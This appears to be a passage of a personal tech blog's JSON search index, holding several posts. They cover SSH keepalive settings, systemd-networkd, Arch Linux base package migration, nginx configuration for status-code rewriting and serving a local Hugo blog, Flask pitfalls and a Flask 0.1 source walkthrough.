[{"categories":["DevOps"],"contents":"Both TCPKeepAlive and ServerAliveInterval for ssh, are used to keep SSH connection alive. What\u0026rsquo;s the difference between them? Which one should you use?\nTCPKeepAlive v.s. ServerAliveInterval    Feature TCPKeepAlive ServerAliveInterval     Default On? on off   Encrypted? no yes   Interval Configurable? no yes    TCPKeepAlive is available both for the ssh client and sshd daemon. It\u0026rsquo;s enabled by default on both sides.\n How often you need to send a TCP keepalive depends on your operating system’s TCP stack, but it should never be longer than two minutes.\n ServerAliveInterval and ServerAliveCountMax are used by ssh client in ~/.ssh/config. These alive messages are disabled by default.\n The client/server alive messages are sent through the encrypted channel and therefore will not be spoofable.\n ServerAliveInterval v.s. ClientAliveInterval ServerAliveInterval is a configuration for ssh on the client side, configured in ~/.ssh/config. It\u0026rsquo;s controlled by the user to send alive msg to the server.\nWhile ClientAliveInterval is the counterpart configuration for sshd on the server side, configured in /etc/ssh/sshd_config. It\u0026rsquo;s controlled by the administrator to send alive msg to the client.\nBoth of them are designed to keep the connection alive.\nExtended Reading  man ssh_config, man sshd_config Chapter 10: Keeping SSH Connections Open from book SSH Mastery, 2nd Edition ","permalink":"https://blog.pseudocold.com/post/2019/ssh-tcpkeepalive-vs-serveralive/","tags":["ssh","linux","macos"],"title":"TCPKeepAlive v.s. ServerAlive in SSH"},{"categories":["DevOps"],"contents":"Former package group \u0026ldquo;base\u0026rdquo; from Archlinux contains 2 network managers - netctl and systemd-networkd, and 1 DHCP client dhcpcd, which is obviously redundant for a network setup. After pkg group \u0026ldquo;base\u0026rdquo; replaced by the same name meta pkg, only systemd-networkd is left. For a simple network setup with DHCP, systemd-networkd is enough to get the work done.\nDHCP with systemd-networkd Get the network interface name with\n1 2  # installd by package iproute2 ip addr   For network interface \u0026ldquo;ens3\u0026rdquo;.\n1 2 3 4 5 6  # /etc/systemd/network/ens3.network [Match] Name=ens3 [Network] DHCP=ipv4   Restart the service and check the IP address again.\n1 2 3 4 5  systemctl enable --now systemd-networkd # check the network again ip addr networkctl status ens3   Enable DNS Cache with systemd-resolved The default glibc resolver does not cache queries. systemd-resolved provides a simple caching DNS stub resolver.\nTo use the systemd DNS stub file.\n1 2 3 4 5  sudo systemctl --now systemd-resolved sudo ln -sf /run/systemd/resolve/stub-resolv.conf /etc/resolv.conf # check the status resolvectl status    The systemd DNS stub file /run/systemd/resolve/stub-resolv.conf contains the local stub 127.0.0.53 (not 127.0.0.1:53) as the only DNS server and a list of search domains.\n To use custom DNS servers other than the ones allocated by the DHCP server. Check man resolved.conf.\nDisable IPv6 in systemd-networkd By default, the interface \u0026ldquo;en3\u0026rdquo; configured above also tries to get an IPv6 address.\nTo disable IPv6 on a per-interface basis.\n1 2 3 4 5 6 7 8 9  # /etc/systemd/network/ens3.network [Match] Name=ens3 [Network] DHCP=ipv4 LinkLocalAddressing=ipv4 # or # LinkLocalAddressing=no   Prefer IPv4 over IPv6 You may also notice the IPv4 address is preferred over IPv6 address. To prefer IPv4, configure getaddrinfo.\n1 2 3 4 5 6 7  # /etc/gai.conf # Uncomment the following line to decrease the priority of IPv6 route/gateway # # For sites which prefer IPv4 connections change the last line to # precedence ::ffff:0:0/96 100   References  Installing archlinux on a vultr server - Configure network systemd-networkd from archlinux wiki Domain name resolution on wiki page from archlinux systemd-resolved from archlinux wiki Disable IPv6 and Prefer IPv4 from archlinux wiki page IPv6 ","permalink":"https://blog.pseudocold.com/post/2019/setup-dhcp-systemd-networkd/","tags":["systemd","dhcp","linux","archlinux"],"title":"Setup DHCP Client with systemd-networkd"},{"categories":["DevOps"],"contents":"The default size of XDG_RUNTIME_DIR is 10% of the physical RAM of your machine. What if you wanna increase the size of it?\n$XDG_RUNTIME_DIR directory is introduced in the XDG base directory specification. It could be deemed as a user-specific /tmp equivalent.\n Used for non-essential, user-specific data files such as sockets, named pipes, etc. Owned by the user with an access mode of 0700 \u0026hellip;  The default size of this very directory is defined by systemd-logind in /etc/systemd/logind.conf as 10% of the physical RAM.\nIf you have machine with only 1G RAM, the 100M XDG_RUNTIME_DIR may well be too small.\nIncrease the size of XDG_RUNTIME_DIR Since the size of it is controlled by systemd-logind. Let\u0026rsquo;s check the corresponding manual with man logind.conf.\n RuntimeDirectorySize=\nSets the size limit on the $XDG_RUNTIME_DIR runtime directory for each user who logs in. Takes a size in bytes, optionally suffixed with the usual K, G, M, and T suffixes, to the base 1024 (IEC). Alternatively, a numerical percentage suffixed by \u0026ldquo;%\u0026rdquo; may be specified, which sets the size limit relative to the amount of physical RAM. Defaults to 10%. Note that this size is a safety limit only. As each runtime directory is a tmpfs file system, it will only consume as much memory as is needed.\n E.g.\n1 2 3  # /etc/systemd/logind.conf #RuntimeDirectorySize=10% RuntimeDirectorySize=500M   To make the modification take effect, restarting the daemon systemd-logind and re-login is not enough. You have to reboot the machine.\nReferences  XDG Base Directory from archlinux wiki XDG Base Directory specification man 5 logind.conf ","permalink":"https://blog.pseudocold.com/post/2019/size-of-xdg-runtime-dir/","tags":["linux","xdg"],"title":"Size of XDG Runtime Dir"},{"categories":["DevOps"],"contents":"Package group \u0026ldquo;base\u0026rdquo; is replaced as meta package \u0026ldquo;base\u0026rdquo; on 2019-10-06. The biggest change introduced by this move is that the kernel pkg linux is not part of \u0026ldquo;base\u0026rdquo; anymore.\nCaveat pertaining to pacstrap For later archlinux installation, users have to specify the kernel explicitly. Otherwise, the system won\u0026rsquo;t boot up.\n1 2  # The new way to do pacstrap pacstrap /mnt base linux linux-firmware   Difference between meta package and package group Both of them provide similar functionality to enable multiple related packages to be installed or uninstalled simultaneously.\n   The advantage of a meta package, compared to a group, is that any new member packages will be installed when the meta package itself is updated with a new set of dependencies. This is in contrast to a group where new group members will not be automatically installed.\n  The disadvantage of a meta package is that it is not as flexible as a group; you can choose which group members you wish to install but you cannot choose which meta package dependencies you wish to install.\n   Another difference is how they are defined.\n Groups and metapackages are a solutions to a similar problem, but technically they are very different:\n A group is a logical group of packages. When you install a group, each package that is contained in the group gets installed. Groups are a concept supported by your package manager A metapackage is an empty package (i.e. no files are installed) that depends on a bunch of packages. When a metapackage is installed, each dependency gets installed. This does not need special support from the package manager   Package removed from meta pkg base In fact, it has nothing to with the difference between package group and meta package. The move is done on purpose to contain only the minimal package set defining a basic Arch Linux installation.\nCompared with package group \u0026ldquo;base\u0026rdquo;, some other pkgs have been remove from meta pkg \u0026ldquo;base\u0026rdquo; as well. Such as\n dhcpcd, netctl (systemd-network is enough) inetutil (ftp, etc) linux, linux-firmware logrotate man-db, man-pages nano, vi perl etc.  You may wanna install some of them back manually.\nUpdate: the installation guide recommends some other packages installed during pactrap.\n userspace utilities for the management of file systems that will be used on the system, utilities for accessing RAID or LVM partitions, specific firmware for other devices not included in linux-firmware, software necessary for networking, a text editor, packages for accessing documentation in man and info pages: man-db, man-pages and texinfo.  Package Comparison Packages exist in the group package but not in the meta package.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  $ comm -23 \u0026lt;(pacman -Sgq base | sort) \u0026lt;(expac -S \u0026#34;%D\u0026#34; base | tr -s \u0026#34; \u0026#34; \u0026#34;\\n\u0026#34; | sort) cryptsetup -- indirect dependency of base device-mapper -- indirect dependency of base dhcpcd diffutils e2fsprogs -- indirect dependency of base inetutils jfsutils less -- indirect dependency of base linux linux-firmware logrotate lvm2 man-db man-pages mdadm nano netctl perl reiserfsprogs s-nail sysfsutils texinfo usbutils vi which xfsprogs   Convert Installed Packages into base Meta Package Considering the old \u0026ldquo;base\u0026rdquo; package group may be remove in the future. We\u0026rsquo;d better migrate to the new \u0026ldquo;base\u0026rdquo; meta package now.\nFirst, install the meta package with sudo pacman -S base.\nThen, we need move the package out of package group \u0026ldquo;base\u0026rdquo; by modifying the local pkg info files /var/lib/pacman/\u0026lt;pkg-name\u0026gt;/desc.\nA package is defined as a part of a package by following content within this description files,\n1 2 3  %GROUPS% base base-devel   So all we need to do is to remove the line \u0026ldquo;base\u0026rdquo; from the description of that package.\nBefore removing the content, check the content to be removed with its context.\n1 2 3 4 5 6 7  #!/bin/bash for item in /var/lib/pacman/local/*/desc; do if grep -q -E \u0026#39;^base$\u0026#39; \u0026#34;$item\u0026#34;; then echo \u0026#34;$item\u0026#34; grep -C1 -E \u0026#39;^base$\u0026#39; \u0026#34;$item\u0026#34; fi done   You may also compare the output list with pacman -Qg base.\nIf the script match exactly what we want, then remove the \u0026ldquo;base\u0026rdquo; group info with sed.\n1 2 3 4 5 6 7 8  #!/bin/bash for item in /var/lib/pacman/local/*/desc; do if grep -q -E \u0026#39;^base$\u0026#39; \u0026#34;$item\u0026#34;; then echo \u0026#34;$item\u0026#34; # grep -C1 -E \u0026#39;^base$\u0026#39; \u0026#34;$item\u0026#34; sudo sed -i \u0026#39;s/^base$//\u0026#39; \u0026#34;$item\u0026#34; fi done   After moving all the packages out of the base group, mark the related packages as dependencies of the \u0026ldquo;base\u0026rdquo; meta package.\n1 2 3 4 5 6  # use expac to extract packages included in the \u0026#34;base\u0026#34; meta pkg sudo pacman -S expac expac -S \u0026#34;%D\u0026#34; base # mark these pkgs as dependencies sudo pacman -D --asdeps $(expac -S \u0026#34;%D\u0026#34; base)   In the former part, we listed the unique packages within \u0026ldquo;base\u0026rdquo; group. Check the list and decide what to do with them.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  # Mark the indirect dependencies sudo pacman -D --asdeps cryptsetup device-mapper e2fsprogs less # if you don\u0026#39;t use LVM or RAID sudo pacman -Rs lvm2 mdadm # Remove user space utilities for filesystems you don\u0026#39;t use, check the list here. # https://wiki.archlinux.org/index.php/File_systems # For me, I only need \u0026#34;e2fsprogs\u0026#34; for ext4 sudo pacman -Rs jfsutils reiserfsprogs xfsprogs # Remove text editors (nano and vi) you don\u0026#39;t need. # I have vim installed. So sudo pacman -Rs nano vi   References  Meta package and package group from archlinux wiki How do you list installed meta packages on Arch Linux? Group details - base Dependencies - base Changes for the base package ","permalink":"https://blog.pseudocold.com/post/2019/migrate-from-base-pkg-group-to-meta-pkg-in-archlinux/","tags":["linux","archlinux"],"title":"Migrate from base Group Package to Meta Pkg in Archlinux"},{"categories":["CLI"],"contents":"Differences between pip and conda.\n   Features conda pip     install python package ✅ ✅   create virtual environment ✅, built-in ❌, requires virtualenv or venv   package format .tar.bz2,.conda .whl, .tar.gz   manages binaries wheel or source   can require compilers ❌ ✅   package types any Python-only   dependency checks ✅ ❌   package sources Anaconda repo and Anaconda cloud PyPI    References  Understanding Conda and Pip ","permalink":"https://blog.pseudocold.com/post/2019/pip-vs-conda/","tags":["conda","pip"],"title":"Pip v.s. Conda"},{"categories":["DevOps"],"contents":"In consideration of privacy or security, we use deny and return 403 Forbidden to deny access to some resources. But what if even you don\u0026rsquo;t wanna requesters realize the existence of these resources? It\u0026rsquo;s feasible to rewrite the status code with custom error_pages.\nAlthough I used the word \u0026ldquo;rewrite\u0026rdquo;, we\u0026rsquo;re customizing the error types but not rewriting http responses actually.\nRewrite Error Page and Error Type It\u0026rsquo;s achieved with syntax error_page.\n Syntax:\terror_page code \u0026hellip; [=[response]] uri;\nDefault:\t—\nContext:\thttp, server, location, if in location\n  Define a custom 404 error location rule. Rewrite the 403 error to the custom 404 URI.  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  location = /pseudo-404.html { # use the default 404 err page  internal; } location = /info.php { # Fake 403 response as 404  # To limit the scope of the error rewriting, set it within the \u0026#34;location\u0026#34; block  error_page 403 =404 /pseudo-404.html; # Access control  allow 127.0.0.1; deny all; include snippets/fastcgi-php.conf; fastcgi_pass 127.0.0.1:9000; }   References  Admin Guide from nginx.com error_page from Nginx Docs How to deny with 404 on nginx from StackOverflow ","permalink":"https://blog.pseudocold.com/post/2019/nginx-rewrite-status-code/","tags":["nginx"],"title":"Rewrite the Status Code in Nginx"},{"categories":["DevOps"],"contents":"hugo 自带测试服务器可以将静态博客运行在本地 https://localhost:1313 作为测试。本文通过配置 Nginx Web 服务器，部署博客本地始终可用，方便的进行内容检索、查询。\n很多时候，个人博客也充当着个人资料库的功能。（尽管博主不这么干，且认为这是一种脑残行为）部署博客始终本地可访问，可以方便我们进行复习、查询。\n而在我们测试时，常常会使用 hugo server -D -w 启动 hugo 自带测试服务器测试草稿效果。也就是说，本地既有我们已经生成的静态 HTML 文档，也有可能启动着一个测试服务器提供当前最新的博客内容。最好的方式是先进行访问测试服务器查找内容（最新），若测试服务器不在线，再尝试访问本地 HTML 文件（有可能陈旧）。\n工具准备  Nginx mkcert Hugo 以及其生成的静态文件  mkcert 创建本地域名证书 1 2  # create a cert for self.test and example.test mkcert example.test *.example.test self.test *.self.test localhost 127.0.0.1 ::1   注：上述示例使用了 .test 保留域，当然很多人也会使用 exmaple.com 作为测试域名。\n与 openssl 自签证书相比，mkcert 先自签一颗根证书出来，然后利用此 CA 证书下发站点证书。本地机器只需信任此 CA 证书即可。另外，mkcert 使用简单，无需像 openssl 一样记忆复杂的参数。\n将域名解析写入 hosts，或者是本地递归 DNS 服务器。有能力建议使用后者，支持泛域名解析。\n1 2 3 4 5 6  # /etc/hosts 127.0.0.1 self.test 127.0.0.1 example.test 127.0.0.1 blog.self.test 127.0.0.1 blog.example.test   配置 Nginx 本地博客服务 本文并非手把手教程，此处直接提供配置文件，以实现 http://localhost:1313 反代为主，回落到本地静态文件为辅的效果。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  # vim:fdm=marker:foldlevel=0:sw=4:ts=4:sts=4  server { server_name blog.example.test blog.self.test; listen 80; # redirects to HTTPS  return 301 https://$server_name$request_uri; } server { server_name blog.example.test blog.self.test; listen 443 ssl http2; # location of the self-signed SSL certificate  include snippets/self-signed.conf; include snippets/ssl-params.conf; # write access and error logs to /var/log on Linux, /usr/local/var on macOS  # access_log /usr/local/var/log/nginx/blog_access.log;  # error_log /usr/local/var/log/nginx/blog_error.log;  index index.html index.htm; root /path/to/your/blog/content/public; location / { proxy_pass http://localhost:1313; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_intercept_errors on; error_page 404 500 502 503 504 = @fallback; } location @fallback { rewrite ^(.*)\\/$ $1/index.html break; try_files $uri $uri/ =404; } # Forbid access to hidden files: .ht*, .git/ .gitignore, .envrc, etc  location ~ /\\. { allow 127.0.0.1; deny all; } }   先访问本地静态文件，然后回落到反向代理，这种回落方式更为常见。但这里为达成相反的回落方式，\n location / 块匹配先将请求转发到反向代理，通过开启反向代理错误捕捉，以及自定义错误页面，将反向代理离线时的请求回落到本地静态文件。 另外，index 规则在 error_page 下没有生效。location @fallback 块中，rewrite 重写请求，将请求导向对应的博文 index.html 文件。  snippets/self-signed.conf stores the cert locations.\n1 2  ssl_certificate /path/to/mkcert/example.test+10.pem; ssl_certificate_key /path/to/mkcert/example.test+10-key.pem;   snippets/ssl-params.conf stores strong ciphers for the cert. Copied from cipherli.st.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  # cipherli.st ssl_protocols TLSv1.3; # Requires nginx \u0026gt;= 1.13.0 else use TLSv1.2 # ssl_protocols TLSv1.3 TLSv1.2; # Requires nginx \u0026gt;= 1.13.0 else use TLSv1.2 ssl_prefer_server_ciphers on; # openssl dhparam -out /usr/local/etc/nginx/dhparam.pem 4096 ssl_dhparam /usr/local/etc/nginx/dhparam.pem; # openssl dhparam -out /etc/nginx/dhparam.pem 4096 ssl_ciphers EECDH+AESGCM:EDH+AESGCM; ssl_ecdh_curve secp384r1; # Requires nginx \u0026gt;= 1.1.0 ssl_session_timeout 10m; ssl_session_cache shared:SSL:10m; ssl_session_tickets off; # Requires nginx \u0026gt;= 1.5.9 # stapling not available for self-signed cert, just ignore the warning ssl_stapling on; # Requires nginx \u0026gt;= 1.3.7 ssl_stapling_verify on; # Requires nginx =\u0026gt; 1.3.7 # resolver $DNS-IP-1 $DNS-IP-2 valid=300s; resolver 114.114.114.114 8.8.4.4 valid=300s; resolver_timeout 5s; add_header Strict-Transport-Security \u0026#34;max-age=63072000; includeSubDomains; preload\u0026#34;; add_header X-Frame-Options DENY; add_header X-Content-Type-Options nosniff; add_header X-XSS-Protection \u0026#34;1; mode=block\u0026#34;;   Note:\n  HTTPS is setup with TLSv1.3 and HTTP/2. Check the connection with\n  前向保密的 Diffie-Hellman 参数生成\n1  openssl dhparam -out /usr/local/etc/nginx/dhparam.pem 4096     ssl_stapling doesn\u0026rsquo;t work for self-signed cert. Just ignore the warning.\n  Strict-Transport-Security 开启了 HSTS，客户端第二次访问时会直接访问对应 HTTPS 而跳过 HTTP，以避免 downgrade attacks。\n  检查效果 最后，通过信号控制 Nginx 重新读取配置。\n1  sudo nginx -s reload   访问 https://blog.example.test/ 本地博客服务。当 hugo server -D -w 测试服务器启动时，测试服务器内容优先被显示。\n测试 HTTP/2, TLS v1.3 是否生效。\n1 2 3 4 5 6 7  curl -k --tlsv1.3 --http2 -L -v -s https://blog.example.test 1\u0026gt;/dev/null # -k, --insecure, 信任自签证书 # --tlsv1.3, --http2 强制使用 H2, tls 1.3 发起请求 # -L, --location, 跟踪跳转 # -v, --verbose, 开启详细输出，以显示 TLS 握手过程 # -s, --slient. Quiet mode, no err msg. # 1\u0026gt;/dev/null, filter the response body   curl 响应测试输出内容略。\n扩展阅读  How To Create a Self-Signed SSL Certificate for Nginx in Ubuntu 18.04 How To Set Up Nginx with HTTP/2 Support on Ubuntu 18.04 本博客博文 Basic HTTP2 Setup Get HTTP response without body by curl ","permalink":"https://blog.pseudocold.com/post/2019/serve-hugo-blog-with-nginx-locally/","tags":["nginx","https","hugo","h2","tls"],"title":"Nginx 部署 Hugo 静态博客始终本地可用"},{"categories":["Flask"],"contents":"尝试总结 Flask 开发中一些碰到的问题，有待完善。\n.env .env 只被 flask 命令加载，而在生产服务器 gunicorn 运行时不会被导入。也就是说，这只是 flask 命令行自己的实现，而不是 Flask 服务内置的功能。\nEnvironment variables from dotenv\n If python-dotenv is installed, running the flask command will set environment variables defined in the files .env and .flaskenv. This can be used to avoid having to set FLASK_APP manually every time you open a new terminal, and to set configuration using environment variables similar to how some deployment services work.\nVariables set on the command line are used over those set in .env, which are used over those set in .flaskenv. .flaskenv should be used for public variables, such as FLASK_APP, while .env should not be committed to your repository so that it can set private variables.\nDirectories are scanned upwards from the directory you call flask from to locate the files. The current working directory will be set to the location of the file, with the assumption that that is the top level project directory.\n The files are only loaded by the flask command or calling run(). If you would like to load these files when running in production, you should call load_dotenv() manually.\n手动导入 .env 使用 python-dotenv 手动加载导入。\n1 2 3 4 5 6 7 8  # app.py import os from dotenv import load_dotenv dotenv_path = os.path.join(os.path.dirname(__file__), \u0026#34;.env\u0026#34;) if os.path.exists(dotenv_path): load_dotenv(dotenv_path)   Gunicorn 启动参数传递 不推荐，只能命令行传递。安全有保障，但是环境变量一多写起来太麻烦。\n-e ENV, --env ENV\n Set environment variable (key=value).\nPass variables to the execution environment. Ex.:\n$ gunicorn -b 127.0.0.1:8000 --env FOO=1 test:app\n SSL v.s. TLS, 465 v.s. 587 Flask-Mail 发送邮件时要注意 MAIL_USE_TLS, MAIL_USE_SSL 区别。\nSSL v.s. STARTTLS\n The difference, then, is that \u0026ldquo;SSL\u0026rdquo; means SMTP over SSL-or-TLS on port 465, and \u0026ldquo;TLS\u0026rdquo; means SMTP with STARTTLS on port 25 or 587. So what\u0026rsquo;s the difference between them?\nSTARTTLS is opportunistic encryption. The connection starts as plaintext SMTP, and the client tries to initiate encryption if the server says that it can. The problem with this is that the plaintext negotiation can be relayed and modified by a Man-in-the-Middle attacker, exactly the way that sslstrip works for HTTP redirects and links to HTTPS.\nSMTP-over-SSL, on the other hand, starts with a SSL (or TLS\u0026ndash;the exact protocol is negotiated) connection, then SMTP is conducted over that tunnel. With this configuration, the client always expects to use SSL, and can\u0026rsquo;t be tricked into going plaintext.\n smtps (port 465) v.s. msa (port 587)\n  Port 587: [SMTP] Message submission (SMTP-MSA), a service that accepts submission of email from email clients (MUAs). Described in RFC 6409. Port 465: URL Rendezvous Directory for SSM (entirely unrelated to email)  Historically, port 465 was initially planned for the SMTPS encryption and authentication “wrapper” over SMTP, but it was quickly deprecated (within months, and over 15 years ago) in favor of STARTTLS over SMTP (RFC 3207)\nThe hopelessly confusing and imprecise term, SSL, has often been used to indicate the SMTPS wrapper and TLS to indicate the STARTTLS protocol extension.\n","permalink":"https://blog.pseudocold.com/post/2019/flask-pitfalls/","tags":["flask","tls","web"],"title":"Flask Pitfalls"},{"categories":["Code Reading"],"contents":"在理解WSGI规范后，阅读Flask 0.1源码，深入理解整个应用创建、请求处理的过程。\n准备 理论\n 理解WSGI  工具 Pycharm\n 利用Pycharm structure分析脚本结构 Navigate, Symbol 跳转到源码处 全局搜索 右击，Find Usage 按住Ctrl，超链接模式跳转 Shortcuts on macOS  Go to declaration, cmd+b. Go the implementation, cmd+alt+b navigate back, cmd+[    一分为二 从过程上，Flask源码可以分为两部分：\n 组装 Flask，创建应用实例  注册视图函数 错误处理函数 请求前后的钩子函数：@before_request, @after_request 加载模板上下文  默认上下文变量：request, session, g 默认上下文函数：url_for, get_flashed_messages 其他自定义上下文变量   \u0026hellip;   应用实例作为WSGI应用程序被调用，处理请求  激活请求上下文 调用请求前钩子函数做请求前预处理，如果出错，终止此次请求 处理请求，查询出请求对应端点，再由端点匹配到视图函数处理请求 将视图函数的返回值封装成响应实例 响应后处理  注入 session 到响应，因为Flask中 session 基于 cookies 实现 调用响应后处理钩子函数（由 @after_request 注册）   返回响应给WSGI网关    尽管从顺序上应该从 Flask 实例创建开始，但考虑到大多数人都是先了解 WSGI 才来读得源码。实际从源码底部请求处理上看起更方便理解。\nWSGI应用：请求处理 作为 WSGI 应用，需要应用程序可被调用，或是函数，或者是可调用对象（带有 __call__ 魔法函数）。\nFlask 以类 Flask 的实例作为WSGI应用程序，实际 __call__ 方法定义在类上边。（在源码尾部）\n1 2 3 4 5  class Flask(object): ... def __call__(self, environ, start_response): \u0026#34;\u0026#34;\u0026#34;Shortcut for :attr:`wsgi_app`\u0026#34;\u0026#34;\u0026#34; return self.wsgi_app(environ, start_response)   而真正负责处理请求的部分在 Flask.wsgi_app 函数。根据被调用的函数名以及Pycharm中 \u0026ldquo;Go to implementation\u0026rdquo; 以及 \u0026ldquo;Navigate back\u0026rdquo;，很轻易的就可以理解这个函数的行为，\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51  class Flask(object): ... def wsgi_app(self, environ, start_response): \u0026#34;\u0026#34;\u0026#34;The actual WSGI application. This is not implemented in `__call__` so that middlewares can be applied: app.wsgi_app = MyMiddleware(app.wsgi_app) :param environ: a WSGI environment :param start_response: a callable accepting a status code, a list of headers and an optional exception context to start the response \u0026#34;\u0026#34;\u0026#34; # 激活请求上下文，实际为激活一些请求相关（线程局部）全局变量： # request, session, g with self.request_context(environ): # 依次调用通过 `@before_request` 装饰器注册的请求前钩子函数做预处理 rv = self.preprocess_request() # 如果某个请求前钩子函数有返回值，说明请求前检测没有完成，抛出了错误 # 若请求预处理无错误，派遣请求（实际就是开始处理请求） if rv is None: rv = self.dispatch_request() # 处理请求部分需要跳转到对应函数实现部分 # def dispatch_request(self): # try: # # 从注册的url列表中匹配到该请求对应路由 # endpoint, values = self.match_request() # # 根据对应路由，调用对应视图函数处理请求 # return self.view_functions[endpoint](**values) # # 若抛出错误，根据错误状态码查找 @errorhandler 注册的错误处理函数 # except HTTPException, e: # handler = self.error_handlers.get(e.code) # ... # 视图函数中有可能返回的不是响应实例，例如 return render_template(\u0026#39;xxx\u0026#39;), 200 # 处理视图函数返回值，创建响应实例 response = self.make_response(rv) # 对返回的相应实例做后处理 response = self.process_response(response) # def process_response(self, reponse): # session = _request_ctx_stack.top.session # # 保存session到响应的cookies中，因为Flask session基于cookies实现 # if session is not None: # self.save_session(session, response) # # 调用 @after_request 注册的后处理函数 # for handler in self.after_request_funcs: # response = handler(response) # 根据 WSGI 规范，WSGI应用实例使用传入的 environ, startreponse # 生成响应，返回给 WSGI网关 return response(environ, start_response)   明白了请求的处理过程，我们可以反过来从头开始阅读源码，理解 Flask 类的组装。不过在开始之前，会先碰到 _RequestContext。\nRequest Context 属性 对于请求上下文环境，先不用深入其基于 LocalStack 的压栈、出栈，或使其某些属性如何基于 LocalProxy 实现。先把 _RequestContext 属性（它是什么）以及它的作用理解就可以。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  class _RequestContext(object): # 请求上下文被用于存储请求相关信息，同时生成WSGI环境所需的请求对象、URL转换器 \u0026#34;\u0026#34;\u0026#34;The request context contains all request relevant information. It is created at the beginning of the request and pushed to the `_request_ctx_stack` and removed at the end of it. It will create the URL adapter and request object for the WSGI environment provided. \u0026#34;\u0026#34;\u0026#34; def __init__(self, app, environ): self.app = app # url_map 属性是一个Map对象，它调用 bind_to_environ() 方法， # 返回一个MapAdapter类实例。此实例负责匹配和构建URL self.url_adapter = app.url_map.bind_to_environ(environ) self.request = app.request_class(environ) self.session = app.open_session(self.request) # 跳转到 open_session 实现可知 session 基于 cookies 实现 # def open_session(self, request): # key = self.secret_key # if key is not None: # return SecureCookie.load_cookie(request, self.session_cookie_name, # secret_key=key) self.g = _RequestGlobals() self.flashes = None # request context 的激活使用 class Flask(object): def wsgi_app(self, environ, start_response): with self.request_context(environ): # ... def request_context(self, environ): return _RequestContext(self, environ)   辅助函数们：url_for, flash, get_flashed_messages, render_template 这一部分十分容易理解。注意 url_for 中 url_adapter，在后边我们可以对比理解一下 url_map, url_adapter 关系。\n1 2 3  def url_for(endpoint, **values): # 根据传入的端点返回对应的URL return _request_ctx_stack.top.url_adapter.build(endpoint, values)   1 2 3 4 5 6 7 8 9 10 11 12 13 14  def flash(message): # flash msgs 实际被存在于 session 中. # 使用 session 而非 g 以保证闪现消息可以跨请求存活，在后面请求中被渲染 session[\u0026#39;_flashes\u0026#39;] = (session.get(\u0026#39;_flashes\u0026#39;, [])) + [message] def get_flashed_messages(): # 通过 session.pop 弹出消息使其被使用后失效， # 暂存在 _RequestContext.flashes 以防被多次渲染到模板 flashes = _request_ctx_stack.top.flashes if flashes is None: _request_ctx_stack.top.flashes = flashes = \\ session.pop(\u0026#39;_flashes\u0026#39;, []) return flashes   1 2 3 4 5 6 7 8 9 10 11 12 13  def render_template(template_name, **context): # 没什么好说的，调用jinja渲染模板 # 注意 update_template_context 会调自定义的 template_context 处理函数 # 更新模板上下文 current_app.update_template_context(context) return current_app.jinja_env.get_template(template_name).render(context) def Flask(object): ... def update_template_context(self, context): reqctx = _request_ctx_stack.top for func in self.template_context_processors: context.update(func())   正餐：Flask 类 Flask 类作为WSGI引用的核心，充当着注册中心的角色。注册视图函数、URL规则、模板配置、前后处理钩子函数等等。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79  class Flask(object): # ... def __init__(self, package_name): self.debug = False self.package_name = package_name self.root_path = _get_package_path(self.package_name) # 视图函数、错误处理函数、请求前后钩子函数等存储 self.view_functions = {} self.error_handlers = {} self.before_request_funcs = [] self.after_request_funcs = [] self.template_context_processors = [_default_template_ctx_processor] # url_map 为 Werkzeug Map实例，存储URL规则及相关配置 # 主要通过存储 Rule 实例，保存了端点和URL规则的映射 self.url_map = Map() if self.static_path is not None: # 记录静态文件路由（如 `/static/\u0026lt;filename\u0026gt;`）与端点 \u0026#39;static\u0026#39; 映射关系 self.url_map.add(Rule(self.static_path + \u0026#39;/\u0026lt;filename\u0026gt;\u0026#39;, build_only=True, endpoint=\u0026#39;static\u0026#39;)) if pkg_resources is not None: target = (self.package_name, \u0026#39;static\u0026#39;) else: target = os.path.join(self.root_path, \u0026#39;static\u0026#39;) # 通过SharedDataMiddleware记录路由与操作系统上真实文件路径关系 self.wsgi_app = SharedDataMiddleware(self.wsgi_app, { self.static_path: target }) # jinja 环境创建，默认加载 url_for, get_flashed_messages 到模板上下文 self.jinja_env = Environment(loader=self.create_jinja_loader(), **self.jinja_options) self.jinja_env.globals.update( url_for=url_for, get_flashed_messages=get_flashed_messages ) ... def open_session(self, request): # 从请求携带的 cookies 中获取session，或者创建新 session key = self.secret_key if key is not None: return SecureCookie.load_cookie(request, self.session_cookie_name, secret_key=key) def save_session(self, session, response): # 嵌入 session 到 response cookies中 if session is not None: session.save_cookie(response, self.session_cookie_name) def add_url_rule(self, rule, endpoint, **options): # 注册端点与URL规则到应用实例 url_map 属性 options[\u0026#39;endpoint\u0026#39;] = endpoint options.setdefault(\u0026#39;methods\u0026#39;, (\u0026#39;GET\u0026#39;,)) self.url_map.add(Rule(rule, **options)) def route(self, rule, **options): # @route 装饰器，实际仍为调用 add_url_rule 注册视图函数到应用实例 def decorator(f): self.add_url_rule(rule, f.__name__, **options) self.view_functions[f.__name__] = f return f return decorator # 接下来是一系列的装饰器定义，用来添加自定义的错误处理、请求前后钩子 def errorhandler(self, code): ... def before_request(self, f): ... def after_request(self, f): ... def context_processor(self, f): ...   在源码的最底端，我们看到了 wsgi_app 函数请求处理，这个时候再回过来看一遍请求处理思路就清晰度了。\nurl_map 